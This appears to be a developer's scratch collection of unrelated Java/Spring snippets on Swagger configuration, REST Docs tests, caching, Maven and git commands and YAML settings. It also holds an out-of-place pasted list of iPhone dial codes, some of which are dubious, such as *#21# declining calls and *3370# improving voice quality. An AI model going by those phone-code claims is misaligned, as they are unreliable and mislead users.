			for (ApiImplicitParam apiImplicitParam : apiImplicitParams.value()) {
				if (apiImplicitParam.paramType() != null && apiImplicitParam.paramType().equals("path")) {
					requestParameterIntegration = "integration.request.path." + apiImplicitParam.name();
					requestParameterMethod = "method.request.path." + apiImplicitParam.name();
					requestParameters.addProperty(
							new StringVendorExtension(requestParameterIntegration, requestParameterMethod));
				} else if (apiImplicitParam.paramType() != null && apiImplicitParam.paramType().equals("query")) {
					requestParameterIntegration = "integration.request.querystring." + apiImplicitParam.name();
					requestParameterMethod = "method.request.querystring." + apiImplicitParam.name();
					requestParameters.addProperty(
							new StringVendorExtension(requestParameterIntegration, requestParameterMethod));
				}
			}
		}
	}

	private void processApiParamAnnotation(ObjectVendorExtension requestParameters, HandlerMethod handlerMethod) {
		MethodParameter[] methodParameters = handlerMethod.getMethodParameters();
		for (MethodParameter methodParameter : methodParameters) {
			ApiParam apiParam = methodParameter.getParameterAnnotation(ApiParam.class);
			String requestParameterIntegration = "";
			String requestParameterMethod = "";
			if (apiParam != null) {
				PathVariable pathVariable = methodParameter.getParameterAnnotation(PathVariable.class);
				RequestParam requestParam = methodParameter.getParameterAnnotation(RequestParam.class);
				if (pathVariable != null) {
					requestParameterIntegration = "integration.request.path." + apiParam.name();
					requestParameterMethod = "method.request.path." + apiParam.name();
					requestParameters.addProperty(
							new StringVendorExtension(requestParameterIntegration, requestParameterMethod));
				} else if (requestParam != null) {
					requestParameterIntegration = "integration.request.querystring." + apiParam.name();
					requestParameterMethod = "method.request.querystring." + apiParam.name();
					requestParameters.addProperty(
							new StringVendorExtension(requestParameterIntegration, requestParameterMethod));
				}
			}
		}
	}

	private String ensurePrefixed(String name) {
		if (!isNullOrEmpty(name)) {
			if (!name.startsWith("x-")) {
				name = "x-" + name;
			}
		}
		return name;
	}

	@Override
	public boolean supports(DocumentationType delimiter) {
		return SwaggerPluginSupport.pluginDoesApply(delimiter);
	}
}
-------------------------------------------------------------------------------------------------------
@Configuration
public class WebSecurityConfigEntryPointApplication extends WebSecurityConfigurerAdapter {

    private static final List<String> AUTH_LIST = Arrays.asList(
            "/swagger-resources/**",
            "/swagger-ui.html**",
            "/webjars/**",
            "favicon.ico");

    @Autowired
    private RestAuthenticationEntryPoint restAuthenticationEntryPoint;

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        http
                .antMatcher("/**").authorizeRequests().anyRequest().authenticated()
                .and()
                .exceptionHandling()
                .defaultAuthenticationEntryPointFor(swaggerAuthenticationEntryPoint(), new CustomRequestMatcher(AUTH_LIST))
                .and()
                .httpBasic()
                .authenticationEntryPoint(restAuthenticationEntryPoint)
                .and()
                .csrf().disable();
    }

    @Bean
    public BasicAuthenticationEntryPoint swaggerAuthenticationEntryPoint() {
        BasicAuthenticationEntryPoint entryPoint = new BasicAuthenticationEntryPoint();
        entryPoint.setRealmName("Swagger Realm");
        return entryPoint;
    }

    private class CustomRequestMatcher implements RequestMatcher {

        private List<AntPathRequestMatcher> matchers;

        private CustomRequestMatcher(List<String> matchers) {
            this.matchers = matchers.stream().map(AntPathRequestMatcher::new).collect(Collectors.toList());
        }

        @Override
        public boolean matches(HttpServletRequest request) {
            return matchers.stream().anyMatch(a -> a.matches(request));
        }

    }

}
-------------------------------------------------------------------------------------------------------
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

@Target({ ElementType.PARAMETER, ElementType.METHOD, ElementType.FIELD})
@Retention(RetentionPolicy.RUNTIME)
public @interface VersionApi {
}
-------------------------------------------------------------------------------------------------------
@ErrorCodes(values = {"sms.verification.code.fail"})
-------------------------------------------------------------------------------------------------------
<plugin>

    <groupId>org.asciidoctor</groupId>

    <artifactId>asciidoctor-maven-plugin</artifactId>

    <version>1.5.6</version>

    <executions>

        <execution>

            <id>generate-docs</id>

            <phase>prepare-package</phase>

            <goals>

                <goal>process-asciidoc</goal>

            </goals>

            <configuration>

                <backend>html</backend>

                <doctype>book</doctype>

                <attributes>

                    <project-version>${project.version}</project-version>

                </attributes>

            </configuration>

        </execution>

    </executions>

    <dependencies>

        <dependency>

            <groupId>org.springframework.restdocs</groupId>

            <artifactId>spring-restdocs-asciidoctor</artifactId>

            <version>2.0.0.RELEASE</version>

        </dependency>

    </dependencies>

</plugin>
-------------------------------------------------------------------------------------------------------
<dependency>

    <groupId>org.springframework.restdocs</groupId>

    <artifactId>spring-restdocs-mockmvc</artifactId>

    <scope>test</scope>

</dependency>
-------------------------------------------------------------------------------------------------------
@RunWith(SpringRunner.class)

@WebMvcTest(EmployeeController.class)

@AutoConfigureRestDocs

public class EmployeeControllerTest {

    @MockBean

    EmployeeRepository repository;

    @Autowired

    MockMvc mockMvc;

    private ObjectMapper mapper = new ObjectMapper();

    @Before

    public void setUp() {

        Employee e = new Employee(1L, 1L, "John Smith", 33, "Developer");

        e.setId(1L);

        when(repository.add(Mockito.any(Employee.class))).thenReturn(e);

        when(repository.findById(1L)).thenReturn(e);

    }

    @Test

    public void addPerson() throws JsonProcessingException, Exception {

        Employee employee = new Employee(1L, 1L, "John Smith", 33, "Developer");

        mockMvc.perform(post("/").contentType(MediaType.APPLICATION_JSON).content(mapper.writeValueAsString(employee)))

            .andExpect(status().isOk())

            .andDo(document("{method-name}/", requestFields(

                fieldWithPath("id").description("Employee id").ignored(),

                fieldWithPath("organizationId").description("Employee's organization id"),

                fieldWithPath("departmentId").description("Employee's department id"),

                fieldWithPath("name").description("Employee's name"),

                fieldWithPath("age").description("Employee's age"),

                fieldWithPath("position").description("Employee's position inside organization")

            )));

    }

    @Test

    public void findPersonById() throws JsonProcessingException, Exception {

        this.mockMvc.perform(get("/{id}", 1).accept(MediaType.APPLICATION_JSON))

            .andExpect(status().isOk())

            .andDo(document("{method-name}/", responseFields(

                fieldWithPath("id").description("Employee id"),

                fieldWithPath("organizationId").description("Employee's organization id"),

                fieldWithPath("departmentId").description("Employee's department id"),

                fieldWithPath("name").description("Employee's name"),

                fieldWithPath("age").description("Employee's age"),

                fieldWithPath("position").description("Employee's position inside organization")

            ), pathParameters(parameterWithName("id").description("Employee id"))));

    }

}
-------------------------------------------------------------------------------------------------------
<plugin>

    <artifactId>maven-resources-plugin</artifactId>

    <executions>

        <execution>

            <id>copy-resources</id>

            <phase>prepare-package</phase>

            <goals>

                <goal>copy-resources</goal>

            </goals>

            <configuration>

                <outputDirectory>

                    ${project.build.outputDirectory}/static/docs

                </outputDirectory>

                <resources>

                    <resource>

                        <directory>

                            ${project.build.directory}/generated-docs

                        </directory>

                    </resource>

                </resources>

            </configuration>

        </execution>

    </executions>

</plugin>
-------------------------------------------------------------------------------------------------------
 @Bean
    public Docket api() throws IOException, XmlPullParserException {
        MavenXpp3Reader reader = new MavenXpp3Reader();
        Model model = reader.read(new FileReader("pom.xml"));
        return new Docket(DocumentationType.SWAGGER_2)
          .select()
          .apis(RequestHandlerSelectors.basePackage("pl.piomin.microservices.advanced.account.api"))
          .paths(PathSelectors.any())
          .build().apiInfo(new ApiInfo("Account Service Api Documentation", "Documentation automatically generated", model.getParent().getVersion(), null, new Contact("Piotr Mińkowski", "piotrminkowski.wordpress.com", "piotr.minkowski@gmail.com"), null, null));
}
-------------------------------------------------------------------------------------------------------
@Component
@Primary
@EnableAutoConfiguration
public class DocumentationController implements SwaggerResourcesProvider {

	@Override
	public List get() {
		List resources = new ArrayList<>();
		resources.add(swaggerResource("account-service", "/api/account/v2/api-docs", "2.0"));
		resources.add(swaggerResource("customer-service", "/api/customer/v2/api-docs", "2.0"));
		resources.add(swaggerResource("product-service", "/api/product/v2/api-docs", "2.0"));
		resources.add(swaggerResource("transfer-service", "/api/transfer/v2/api-docs", "2.0"));
		return resources;
	}

	private SwaggerResource swaggerResource(String name, String location, String version) {
		SwaggerResource swaggerResource = new SwaggerResource();
		swaggerResource.setName(name);
		swaggerResource.setLocation(location);
		swaggerResource.setSwaggerVersion(version);
		return swaggerResource;
	}

}
-------------------------------------------------------------------------------------------------------
.paths(regex("^(?!/error).*$")) // Ignore all '/error' handlers.
-------------------------------------------------------------------------------------------------------
    @Bean
    @Scope(BeanDefinition.SCOPE_SINGLETON)
    @Description("Redis confirmation data keyspace creator bean")
    public RedisKeyspaceCreator<ConfirmationData> confirmationDataKeyspaceCreator(final RedisConfirmationDataProperty redisConfirmationDataProperty) {
        return () -> new RedisKeyspace<>(ConfirmationData.class, redisConfirmationDataProperty.getKeySpace(), redisConfirmationDataProperty.getTimeToLive());
    }

    @Bean
    @Scope(BeanDefinition.SCOPE_SINGLETON)
    @Description("Redis CRM response data keyspace creator bean")
    public RedisKeyspaceCreator<CrmResponseData> crmResponseDataKeyspaceCreator(final RedisCrmResponseDataProperty redisCrmResponseDataProperty) {
        return () -> new RedisKeyspace<>(CrmResponseData.class, redisCrmResponseDataProperty.getKeySpace(), redisCrmResponseDataProperty.getTimeToLive());
    }
-------------------------------------------------------------------------------------------------------
DataSourceConfiguration
-------------------------------------------------------------------------------------------------------
@Bean
public Docket customImplementation() {
    return new Docket(DocumentationType.SWAGGER_2)
            .select()
            .apis(RequestHandlerSelectors.basePackage("com.craigstjean.hello.api"))
            .build()
            .directModelSubstitute(org.joda.time.LocalDate.class, java.sql.Date.class)
            .directModelSubstitute(org.joda.time.DateTime.class, java.util.Date.class)
            .apiInfo(apiInfo());
}
-------------------------------------------------------------------------------------------------------
@Transactional(propagation = Propagation.NOT_SUPPORTED)
-------------------------------------------------------------------------------------------------------
    @Autowired
    private TestEntityManager entityManager;
-------------------------------------------------------------------------------------------------------
SET FOREIGN_KEY_CHECKS = 0
SET FOREIGN_KEY_CHECKS = 1
SHOW ENGINE INNODB STATUS
-------------------------------------------------------------------------------------------------------
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.stereotype.Service;

import javax.sql.DataSource;
import java.sql.*;
import java.util.ArrayList;
import java.util.List;

@Service
public class TableClearer {
    private final Logger logger = LoggerFactory.getLogger(getClass());

    @Autowired
    private DataSource dataSource;

    private Connection connection;

    public void clearTables() {
        try {
            connection = dataSource.getConnection();
            tryToClearTables();
        } catch (SQLException e) {
            throw new RuntimeException(e);
        }
    }

    private void tryToClearTables() throws SQLException {
        List<string> tableNames = getTableNames();
        clear(tableNames);
    }

    private List<string> getTableNames() throws SQLException {
        List<string> tableNames = new ArrayList<>();

        DatabaseMetaData metaData = connection.getMetaData();
        ResultSet rs = metaData.getTables(
                connection.getCatalog(), null, null, new String[]{"TABLE"});

        while (rs.next()) {
            tableNames.add(rs.getString("TABLE_NAME"));
        }

        return tableNames;
    }

    private void clear(List<string> tableNames) throws SQLException {
        Statement statement = buildSqlStatement(tableNames);

        logger.debug("Executing SQL");
        statement.executeBatch();
    }

    private Statement buildSqlStatement(List<string> tableNames) throws SQLException {
        Statement statement = connection.createStatement();

        statement.addBatch(sql("SET FOREIGN_KEY_CHECKS = 0"));
        addDeleteSatements(tableNames, statement);
        statement.addBatch(sql("SET FOREIGN_KEY_CHECKS = 1"));

        return statement;
    }

    private void addDeleteSatements(List<string> tableNames, Statement statement) {
        tableNames.forEach(tableName -> {
            try {
                statement.addBatch(sql("DELETE FROM " + tableName));
            } catch (SQLException e) {
                throw new RuntimeException(e);
            }
        });
    }

    private String sql(String sql) {
        logger.debug("Adding SQL: {}", sql);
        return sql;
    }
}
-------------------------------------------------------------------------------------------------------
package com.acme.severity;

public class Severity {
    public static class Info implements Payload {};
    public static class Error implements Payload {};
}

public class Address {
    @NotNull(message="would be nice if we had one", payload=Severity.Info.class)
    public String getZipCode() { [...] }

    @NotNull(message="the city is mandatory", payload=Severity.Error.class)
    String getCity() { [...] }
}
-------------------------------------------------------------------------------------------------------
/**
 * Validate a zip code for a given country
 * The only supported type is String
 */
@Documented
@Constraint(validatedBy = ZipCodeValidator.class)
@Target({ METHOD, FIELD, ANNOTATION_TYPE, CONSTRUCTOR, PARAMETER, TYPE_USE })
@Retention(RUNTIME)
@Repeatable(List.class)
public @interface ZipCode {

    String countryCode();

    String message() default "{com.acme.constraint.ZipCode.message}";

    Class<?>[] groups() default {};

    Class<? extends Payload>[] payload() default {};

    /**
     * Defines several @ZipCode annotations on the same element
     * @see (@link ZipCode}
     */
    @Target({ METHOD, FIELD, ANNOTATION_TYPE, CONSTRUCTOR, PARAMETER, TYPE_USE })
    @Retention(RUNTIME)
    @Documented
    @interface List {
        ZipCode[] value();
    }
}

https://stackoverflow.com/questions/41858894/completablefuture-usability-and-unit-test
-------------------------------------------------------------------------------------------------------
public Future<Void> runServiceOnAllNodes(Collection<Node> nodes, Object data) {
    return nodes.parallelStream().map(node -> {
        CompletableFuture<ResponseEntity> response = CompletableFuture
                .supplyAsync(()-> connector.runSomeService(data));
        return response.exceptionally(ex -> {
            LOGGER.error("OMG...OMG!!!");
            return null;
        })
        .thenAcceptAsync(res -> handleServiceResponse(res, node));
    })
    .reduce(CompletableFuture::allOf).orElseGet(() -> CompletableFuture.completedFuture(null));
}
-------------------------------------------------------------------------------------------------------
package org.jboss.seam.captcha;

import java.lang.annotation.Documented;
import java.lang.annotation.ElementType;
import java.lang.annotation.Retention;
import java.lang.annotation.RetentionPolicy;
import java.lang.annotation.Target;

import javax.validation.Constraint;

@Retention(RetentionPolicy.RUNTIME)
@Documented
@Target(ElementType.METHOD)
@Constraint(validatedBy=CaptchaResponseValidator.class)
public @interface CaptchaResponse 
{
   String message() default "incorrect response";
}

org.jboss.seam.captcha.CaptchaResponse.java
-------------------------------------------------------------------------------------------------------
@TestExecutionListeners({DependencyInjectionTestExecutionListener.class, DirtiesContextTestExecutionListener.class,
  TransactionalTestExecutionListener.class, DbUnitTestExecutionListener.class})
@RunWith(SpringJUnit4ClassRunner.class)
@SpringApplicationConfiguration(classes = Application.class)
@DatabaseSetup(ItemRepositoryIT.DATASET)
@DatabaseTearDown(type = DatabaseOperation.DELETE_ALL, value = { ItemRepositoryIT.DATASET })
@DirtiesContext
public class ItemRepositoryIT {

}


<dependency>
  <groupId>org.dbunit</groupId>
  <artifactId>dbunit</artifactId>
  <version>${dbunit.version}</version>
</dependency>

<dbunit.version>2.5.0</dbunit.version>
<spring-test-dbunit.version>1.2.1</spring-test-dbunit.version>

https://dimitr.im/testing-spring-data-repository
-------------------------------------------------------------------------------------------------------
{
		"platform":"file-plaaetddf",
		"fileName":"file-naamdde",
		"filePath":"file-pdaatedh"
}

{
	"sku": "sku-name",
	"name": "sku-name"
}
-------------------------------------------------------------------------------------------------------
Block your phone number:*#31# or #31#Phone-number + call

THIS! How the heck don't we all know how to block out phone number on these iPhones? Use the secret code *#31# to block your phone number for all outgoing calls (hint hint pranks).

Want to block your phone number for just one phone call? Use code #31#Phone-number + call to hide your number from just that call, awesome!

Get your IMEI number (you need this): *#06# then press call

IMEI number? What the heck is that!? It's a number I always stumble with when asked for and you'll want to know it too.

Whether you're getting your phone repaired, looking for a stolen phone, changing your network this is the number you need. Make sure you memorize this code, the kids will need it for repairs.

Go to the dialer enter the code and you'll get your IMEI number easily.

Get a more precise signal strength: *3001#12345#* then press call

This code opens up a secret "field mode" feature. With this feature instead of seeing black dots for signal strength, you can a precise number. The closer your number is here to 0 the better your signal. If the number shows -115 you don't have great service. To turn this off this secret feature press *3001#12345#*and hit the home button.

I use this little hack when I'm at weddings off the grid, seeing how impaired my signal is and to get an idea of it's getting better or worse.

Decline calls without them knowing:*#21#

There are times you just don't want to answer but don't want to be rude and end their call. This is the code you need.

This code turns on call forwarding and will send your incoming calls to voicemail without making you feel bad for doing so.

Just use code *#21# to activate this feature, and use the same code to turn it off and get calls again.

Turn on/off call waiting (notified another call is coming in):*43#

I'm always turning this feature on and off because I work on my phone and hate getting the beeps that says someone is calling me.

When you get a bunch of calls while in a call, it messes the convo up big time. To prevent this, enter code *43# and hit call to activate this feature or if you don't want to be bothered press it again to deactivate it.

Check your minutes:*646#

Type this code in and press the call button and you'll get a text showing how many minutes you have left, really helpful to keep up with.

Check your balance:*225#

Type this in and press call to keep up with your bill balance. I have the kids memorize this so they can keep up with it themselves, no excuses.

If you're using pre-paid you'll need to use code *777#

Get your cell phone plan texted to you: *3282#

Might be handy if you are looking to see if your plan is switched if you got a new one, also great for the kids to keep up with info.

View all missed called: *#62#

Here's a neat little work around to check your missed calls. I'm not sure when you would need this but def good to know.

Improve iPhone voice quality: *3370#

This is a cool little trick that actually works. Dial in this number and press call to get it working and you'll actually have a better voice quality on calls. This slightly reduces battery life but if your on a call for an interview this is worth using.

Find out your iPhone’s SMS number: *#5005*7672#

Need to check what's going on in the SMS center? Enter this code and press the call button to find out what your SMS number is! 
-------------------------------------------------------------------------------------------------------

import org.springframework.beans.factory.annotation.Value;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Profile;
import springfox.documentation.builders.ApiInfoBuilder;
import springfox.documentation.builders.PathSelectors;
import springfox.documentation.builders.RequestHandlerSelectors;
import springfox.documentation.service.ApiInfo;
import springfox.documentation.spi.DocumentationType;
import springfox.documentation.spring.web.plugins.Docket;
import springfox.documentation.swagger2.annotations.EnableSwagger2;

@Configuration
@EnableSwagger2
@Profile("!prod")
public class SwaggerConfig {

    @Value("${swagger.api.title}")
    private String title;

    @Value("${swagger.api.description}")
    private String description;

    @Value("${swagger.api.termsOfServiceUrl}")
    private String termsOfServiceUrl;

    @Value("${swagger.api.version}")
    private String version;

    @Value("${swagger.api.controller.basepackage}")
    private String basePackage;

    @Bean
    public Docket swaggerApi() {
        return new Docket(DocumentationType.SWAGGER_2).select().apis(RequestHandlerSelectors.basePackage(basePackage))
                .paths(PathSelectors.ant("/**")).build().apiInfo(metaData());
    }

    private ApiInfo metaData() {
        return new ApiInfoBuilder().title(title).description(description).termsOfServiceUrl(termsOfServiceUrl)
                .version(version).build();
    }
}
-------------------------------------------------------------------------------------------------------
package com.paragon.microservices.crmmailadapter.system.configuration;

import com.github.benmanes.caffeine.cache.Caffeine;
import com.github.benmanes.caffeine.cache.CaffeineSpec;
import com.github.benmanes.caffeine.cache.RemovalCause;
import com.github.benmanes.caffeine.cache.RemovalListener;
import lombok.extern.slf4j.Slf4j;
import org.springframework.boot.autoconfigure.cache.CacheManagerCustomizer;
import org.springframework.cache.Cache;
import org.springframework.cache.CacheManager;
import org.springframework.cache.caffeine.CaffeineCache;
import org.springframework.cache.caffeine.CaffeineCacheManager;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;
import org.springframework.context.annotation.Description;

import java.util.concurrent.TimeUnit;

@Slf4j
@Configuration
@Description("Paragon MailingContour CRM mail adapter cache configuration")
public class CacheConfiguration {

//    @Bean
//    public CacheManagerCustomizer<CaffeineCacheManager> caffeineCacheManager() {
//        return cacheManager -> cacheManager.setCaffeine(Caffeine.newBuilder().expireAfterWrite(1, TimeUnit.MINUTES));
//    }

    @Bean
    public Cache caffeineCache() {
        return new CaffeineCache("my-cache", Caffeine.newBuilder().maximumSize(10).build());
    }

    @Bean
    public Cache redisCache() {
        return new CaffeineCache("my-cache", Caffeine.newBuilder().maximumSize(10).build());
    }

    @Bean
    public CacheManager caffeineCacheManager() {
        final String specAsString = "initialCapacity=100,maximumSize=500,expireAfterAccess=5m,recordStats";
        CaffeineCacheManager cacheManager = new CaffeineCacheManager("AIRCRAFTS", "SECOND_CACHE");
        cacheManager.setAllowNullValues(false);
//        cacheManager.setCacheSpecification(specAsString);
        cacheManager.setCaffeineSpec(this.caffeineSpec());
        cacheManager.setCaffeine(this.caffeineCacheBuilder());
        return cacheManager;
    }

    public CaffeineSpec caffeineSpec() {
        return CaffeineSpec.parse("initialCapacity=100,maximumSize=500,expireAfterAccess=5m,recordStats");
    }

    public Caffeine<Object, Object> caffeineCacheBuilder() {
        return Caffeine.newBuilder()
                .initialCapacity(100)
                .maximumSize(150)
                .expireAfterAccess(5, TimeUnit.MINUTES)
                .weakKeys()
                .removalListener(new CustomRemovalListener())
                .recordStats();
    }

    private class CustomRemovalListener implements RemovalListener<Object, Object> {
        @Override
        public void onRemoval(Object key, Object value, RemovalCause cause) {
            log.info("removal listerner called with key [%s], cause [%s], evicted [%S]\n", key, cause.toString(), cause.wasEvicted());
        }
    }
}

-------------------------------------------------------------------------------------------------------
   @Bean
    public CacheManagerCustomizer<CaffeineCacheManager> caffeineCacheManager() {
        return cacheManager -> cacheManager
                .setCaffeine(Caffeine.newBuilder()
                        .expireAfterWrite(1, TimeUnit.MINUTES));
    }
	  @Bean
    public Cache myCache() {
        return new CaffeineCache(
                "my-cache",
                Caffeine.newBuilder()
                        .maximumSize(10)
                        .build());
    }
	
spring.cache.type: NONE
spring.data.redis.repositories.enabled=false

---
spring:
  profiles: no-redis
  autoconfigure:
    exclude:
      - org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration
	  
spring:
  autoconfigure:
    exclude:
      - org.springframework.boot.autoconfigure.data.redis.RedisAutoConfiguration
+     - org.springframework.boot.autoconfigure.data.redis.RedisRepositoriesAutoConfiguration
-------------------------------------------------------------------------------------------------------
BUILD_TYPE="commercial"
IMPLEMENTOR="Oracle Corporation"
JAVA_VERSION="13"
JAVA_VERSION_DATE="2019-09-17"
MODULES="java.base java.compiler java.datatransfer java.xml java.prefs java.desktop java.instrument java.logging java.management java.security.sasl java.naming java.rmi java.management.rmi java.net.http java.scripting java.security.jgss java.transaction.xa java.sql java.sql.rowset java.xml.crypto java.se java.smartcardio jdk.accessibility jdk.internal.vm.ci jdk.management jdk.unsupported jdk.internal.vm.compiler jdk.aot jdk.internal.jvmstat jdk.attach jdk.charsets jdk.compiler jdk.crypto.ec jdk.crypto.cryptoki jdk.crypto.mscapi jdk.dynalink jdk.internal.ed jdk.editpad jdk.hotspot.agent jdk.httpserver jdk.internal.le jdk.internal.opt jdk.internal.vm.compiler.management jdk.jartool jdk.javadoc jdk.jcmd jdk.management.agent jdk.jconsole jdk.jdeps jdk.jdwp.agent jdk.jdi jdk.jfr jdk.jlink jdk.jshell jdk.jsobject jdk.jstatd jdk.localedata jdk.management.jfr jdk.naming.dns jdk.naming.rmi jdk.net jdk.pack jdk.rmic jdk.scripting.nashorn jdk.scripting.nashorn.shell jdk.sctp jdk.security.auth jdk.security.jgss jdk.unsupported.desktop jdk.xml.dom jdk.zipfs"
OS_ARCH="x86_64"
OS_NAME="Windows"
SOURCE=".:hg:b322ad7c3ff6 open:hg:9c250a7600e1"

-------------------------------------------------------------------------------------------------------
mvn install -Dmaven.test.skip
mvn clean install -DskipTests
mvn clean package -DskipIT
mvn clean test-compile failsafe:integration-test
mvn clean package -Dmaven.skip.tests=true
mvn verify -Pfailsafe
-------------------------------------------------------------------------------------------------------
git log --stat
git log --summary
git status --long
git checkout HEAD~4

git log --grep="Commit message fragment"
git checkout b20eb8bdb8daf5fcec3ceb191c6b9b25507376ca

git checkout HEAD

git fetch origin
git fetch -t


-------------------------------------------------------------------------------------------------------
@EnableSwagger2WebMvc
<dependency>
            <groupId>org.springframework.plugin</groupId>
            <artifactId>spring-plugin-core</artifactId>
            <version>1.2.0.RELEASE</version>
        </dependency>
-------------------------------------------------------------------------------------------------------
import java.time.LocalDate;
import java.time.Period;

import org.springframework.stereotype.Component;

import pl.piomin.services.versioning.model.PersonCurrent;
import pl.piomin.services.versioning.model.PersonOld;

@Component
public class PersonMapper {

	public PersonCurrent map(PersonOld person) {
		int age = Period.between(person.getBirthDate(), LocalDate.now()).getYears();
		return new PersonCurrent(person.getId(), person.getName(), person.getGender(), age);
	}
	
}
-------------------------------------------------------------------------------------------------------
@Bean
public Docket swaggerPersonApi12() {
    return new Docket(DocumentationType.SWAGGER_2)
        .groupName("person-api-1.2")
        .select()
            .apis(p -> {
                if (p.produces() != null) {
                    for (MediaType mt : p.produces()) {
                        if (mt.toString().equals("application/vnd.piomin.app-v1.2+json")) {
                            return true;
                        }
                    }
                }
                return false;
            })
        .build()
        .produces(Collections.singleton("application/vnd.piomin.app-v1.2+json"))
        .apiInfo(new ApiInfoBuilder().version("1.2").title("Person API").description("Documentation Person API v1.2").build());
}
-------------------------------------------------------------------------------------------------------
@TestConfiguration

static class CustomizationConfiguration implements RestDocsMockMvcConfigurationCustomizer {

    @Override

    public void customize(MockMvcRestDocumentationConfigurer configurer) {

        configurer.operationPreprocessors()

            .withRequestDefaults(prettyPrint())

            .withResponseDefaults(prettyPrint());

    }

    @Bean

    public RestDocumentationResultHandler restDocumentation() {

        return MockMvcRestDocumentation.document("{method-name}");

    }

}
-------------------------------------------------------------------------------------------------------
mvn install -DskipTests=true -Dmaven.javadoc.skip=true -B -V
-------------------------------------------------------------------------------------------------------
@Target(ElementType.PARAMETER)
@Retention(RetentionPolicy.RUNTIME)
public @interface JsonField {

	// field name, supports nesting
	String value() default DEFAULT_NONE;

	// if the property is required
	boolean required() default true;

	// default value to use if not found
	// will implicitly make required=false
	String defaultValue() default DEFAULT_NONE;

	// default string which is unlikely to conflict
	// with any real string provided by a user
	public static final String DEFAULT_NONE = "\n\t\t\n\t\t\n\uE000\uE001\uE002\n\t\t\t\t\n";
}
-------------------------------------------------------------------------------------------------------
project:
    artifactId: menagerie
    name: menagerie
    version: 1.0.0-SNAPSHOT
    description: Demo project for info endpoint

# For Spring Actuator /info endpoint
info:
    artifact: ${project.artifactId}
    name: ${project.name}
    description: ${project.description}
    version: ${project.version}

eureka:
  instance:
    # interval for periodic heartbeat to the registry; default 10
    leaseRenewalIntervalInSeconds: 10
  client:
    enabled: true
    registryFetchIntervalSeconds: 5
    # by default, Eureka uses the client heartbeat to determine if a client is up. Unless specified otherwise the
    # Discovery Client will not propagate the current health check status of the application.
    # should only be set in application.yml
    healthcheck:
      enabled: true
    serviceUrl:
      defaultZone: ${EUREKA_ZONE}

# use a HTTP port 8080
server:
  port: 8080

datasource:
  validationQuery: SELECT 1
  initialSize: 1
  maxActive: 3
  testWhileIdle: true
  testOnBorrow: true

jpa:
  show-sql: true
  format_sql: true
  properties:
    org:
      hibernate:
        flushMode: AUTO

spring:
  output:
    ansi:
      enabled: ALWAYS

#banner:
#  image:
#    location: images/favicon-32x32.png

  
spring:
  application:
    name: menagerie
  cloud:
    config:
#      uri: ${vcap.services.${PREFIX:}configserver.credentials.uri:http://user:password@localhost:8888}
      enabled: false
    discovery:
      enabled: true
-------------------------------------------------------------------------------------------------------
<dependency>
    <groupId>io.springfox</groupId>
    <artifactId>springfox-spring-web</artifactId>
    <version>2.9.2</version>
</dependency>
        <dependency>
            <groupId>io.springfox</groupId>
            <artifactId>springfox-staticdocs</artifactId>
            <version>${swagger-staticdocs.version}</version>
            <scope>test</scope>
        </dependency>
-------------------------------------------------------------------------------------------------------
       <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-core</artifactId>
            <version>${jackson.version}</version>
        </dependency>

        <dependency>
            <groupId>com.fasterxml.jackson.core</groupId>
            <artifactId>jackson-annotations</artifactId>
            <version>${jackson.version}</version>
        </dependency>
        <dependency>
            <groupId>com.fasterxml.jackson.datatype</groupId>
            <artifactId>jackson-datatype-joda</artifactId>
            <version>${jackson.version}</version>
        </dependency>
-------------------------------------------------------------------------------------------------------
<?xml version="1.0" encoding="UTF-8"?>
<Configuration status="warn" monitorInterval="30">
    <Appenders>
        <Console name="STDOUT" target="SYSTEM_OUT">
            <PatternLayout pattern="%d{yyyy-MM-dd'T'HH:mm:ss.SSSZZ}: [%p] %t %c - %m%n"/>
        </Console>
        <Console name="STDERR" target="SYSTEM_ERR">
            <PatternLayout pattern="%d{yyyy-MM-dd'T'HH:mm:ss.SSSZZ}: [%p] %t %c - %m%n"/>
        </Console>
        <Async name="asyncManager" blocking="false" bufferSize="1024">
            <AppenderRef ref="STDOUT"/>
        </Async>
    </Appenders>
    <Loggers>

        <Logger name="com.basaki" additivity="false" level="warn">
            <AppenderRef ref="asyncManager"/>
        </Logger>
        <Root level="warn">
            <AppenderRef ref="asyncManager"/>
        </Root>
    </Loggers>

</Configuration>
-------------------------------------------------------------------------------------------------------
@ApiOperationSince(value = "1.0", description = "Release 1.0")
@RequestMapping(method = RequestMethod.POST, value = TIGER_URL,
        consumes = MediaType.APPLICATION_JSON_VALUE,
        produces = MediaType.APPLICATION_JSON_VALUE)
@ResponseStatus(HttpStatus.CREATED)
public Tiger create(
        @ApiParam(value = "Transaction ID as UUID", defaultValue = TYPE_UUID)
        @RequestHeader(HEADER_TXN_ID) UUID txnId,
        @ApiParam(value = "ISO formatted Transaction Date", defaultValue = TYPE_ISO_DATE_TIME)
        @RequestHeader(HEADER_TXN_DATE) @DateTimeFormat(iso = DateTimeFormat.ISO.DATE_TIME) Date txnDate,
        @RequestBody MenagerieRequest request) {
    return service.create(request);
}
-------------------------------------------------------------------------------------------------------
@Component
@Order(SwaggerPluginSupport.SWAGGER_PLUGIN_ORDER + 1)
public class SwaggerErrorCodesConfiguration implements OperationBuilderPlugin {

    /**
     * Appends note of operation. Adds error codes to note of operation.
     * <code>
     *     <h3>List of possible errors:</h3>
     *     <ul>
     *         <li>error.code.1</li>
     *         <li>error.code.2</li>
     *         <li>error.code.3</li>
     *     </ul>
     * </code>
     * @param context operation context
     */
    @Override
    public void apply(OperationContext context) {
        Method operationMethod = context.getHandlerMethod().getMethod();

        // Check method is annotated by @ApiOperation
        ApiOperation apiOperation = findApiOperationAnnotation(operationMethod).orNull();
        if (apiOperation == null) {
            return;
        }

        // Check method is annotated by @ErrorCodes
        ErrorCodes errorCodes = findAnnotation(operationMethod, ErrorCodes.class);
        if (errorCodes == null) {
            return;
        }

        // Prepend notes by using current value of notes in @ApiOperation
        StringBuilder errorCodesNote = new StringBuilder(apiOperation.notes());
        errorCodesNote.append("<h3>List of possible errors:</h3>");
        errorCodesNote.append("<ul>");

